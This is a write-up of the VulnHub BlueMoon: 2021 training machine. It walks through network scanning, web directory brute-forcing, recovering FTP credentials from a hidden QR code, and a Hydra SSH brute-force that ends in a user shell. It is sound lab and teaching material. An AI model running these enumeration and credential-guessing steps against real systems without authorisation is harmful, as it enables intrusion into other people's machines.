# VulnHub BlueMoon: 2021 Walkthrough

## Overview

This repository is my walkthrough for the **BlueMoon: 2021** machine on **VulnHub**.
The challenge is to find out the target, check what services are running, get initial access, and then work my way up to root.

## Machine Details

| Item | Description |                       
|------|-------------|
| Machine Name | BlueMoon: 2021 |
| Platform | VulnHub |
| Difficulty | Easy |
| Type | Boot2Root |
| Goal | Obtain root access |

## Target Information
* **Hostname:** BlueMoon 
* **Target IP:** 192.168.56.101 
* **Operating System:** Debian GNU/Linux 10 
* **Attacker IP:** 192.168.56.102 

## 1. Reconnaissance
The first step was identifiying the target machine on the local network.

I used ```netdiscover``` to find the active host.

```bash
sudo netdiscover
```
For more detail, I also used ```ifconfig``` to know the attacker's IP.

```bash
ifconfig
```
I scanned using ```nmap -sn [Network Address]``` to skip port porbing and see more detail of the target's IP.

```bash
nmap -sn 192.168.56.0/24
```

## 2. Port Scanning
Next, I scanned the target to identify open ports and services.

```bash
nmap -sC -sV -Pn -vv 192.168.56.101
```

The scan show an important open ports:

* ```21/tcp``` running FTP service with ``vsftpd 3.0.3``.
* ```22/tcp``` running SSH service with ``OpenSSH 7.9p1``.
* ```80/tcp``` running HTTP service with ``Apache httpd 2.4.38``.

## 3. Web Enumeration
The purpose of using ```dirb``` command is **Directory Brute-forcing**. It is used to discover hidden files and directories on the web server that aren't visible to a normal visitor.
```bash
dirb http://192.168.56.101 ~/Dektop/wordlist.txt -X -php.html.txt
```

* Targeting: It scans the web server located at http://192.168.56.101.
* Wordlist: It uses a custom list of names (wordlist.txt) from the Desktop to guess folder and file names.
* Extensions: The -X flag tells the tool to specifically look for files ending in .php, .html, and .txt.
* Discovery: In this specific scan, it successfully found **index.html** with a CODE:200, meaning the page exists and is accessible.

Next, I used ```gobuster``` to perform directory brute-forcing on the target web server.

```bash
gobuster dir -u http://192.168.56.101 --wordlist /usr/share/disbuster/wordlists/directory-list-2.3-medium.txt
```
* Initial Discovery: Automated directory enumeration with Gobuster successfully identified a hidden path at /hidden_text (Status: 200).
* Landing Page: Accessing the root URL at http://192.168.56.101 presented a "Welcome" page featuring the message, "The Game Begins".
* Hidden Directory: Navigating to the /hidden_text directory led to a maintenance notice stating, "Maintanance! Sorry For Delay. We Will Recover Soon"
* QR Code Extraction: By interacting with the "Thank You..." link on the maintenance page, I uncovered a hidden image file named .QR_C0d3.png
* Credential Retrieval: Decoding the QR code revealed an embedded bash script that contained hardcoded FTP credentials for the user with the password

```bash
user: userftp     password: fttp@ssword
```

## 4. FTP Access
```ftp [target's IP]``` is used to initiate a connection to the File Transfer Protocol (FTP) service running on the target machine.

```bash
ftp 192.168.56.101
```
* I performed a directory listing using the ```ls``` command to identify available files.

```bash
ls
```

* I discovered two critical files on the server: ```information.txt``` and ```p_lists.txt```, which appeared to contain sensitive data or hints for the next stage of the attack.
* The primary purpose of this step was to download these files to my local attacker machine using the get command for offline analysis.

```bash
get information.txt
get p_lists.txt
```
* The successful transfer of ```information.txt``` and ```p_lists.txt``` provided the necessary information to move forward with the exploitation.
* Once the data retrieval was complete, I terminated the FTP session using the ```exit``` command to clean up my connection

```bash
exit
```

Next, I used the ls command on my local machine to confirm that information.txt and p_lists.txt were successfully downloaded.

```bash
ls
```

I used the ```cat``` command to view the contents of information.txt, which revealed a message addressed to a user named robin and also the password.

```bash
cat information.txt
```

Then, run ```cat p_lists.txt``` to displayed a custom wordlist containing various common and leetspeak-style passwords.

```bash
cat p_lists.txt
```
With these two pieces of information, the next logical step is to attempt an SSH brute-force attack to gain a shell on the target machine.

## 4. User Access
The information.txt file hinted that the user robin had a weak password from the provided list. I used Hydra to brute-force the SSH login.

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.101
```
Successfully found **password** for the user 'robin' : ```k4rv3ndh4nh4ck3r```

I used the ssh robin@192.168.56.101 command to attempt a remote login as the user robin.
```bash
ssh robin@192.168.56.101
```
I entered the password ```k4rv3ndh4nh4ck3r``` found during the brute-force attack and successfully gained access to the machine

The command prompt changed to robin@BlueMoon:~$, confirming that I now have a stable shell on the target system.





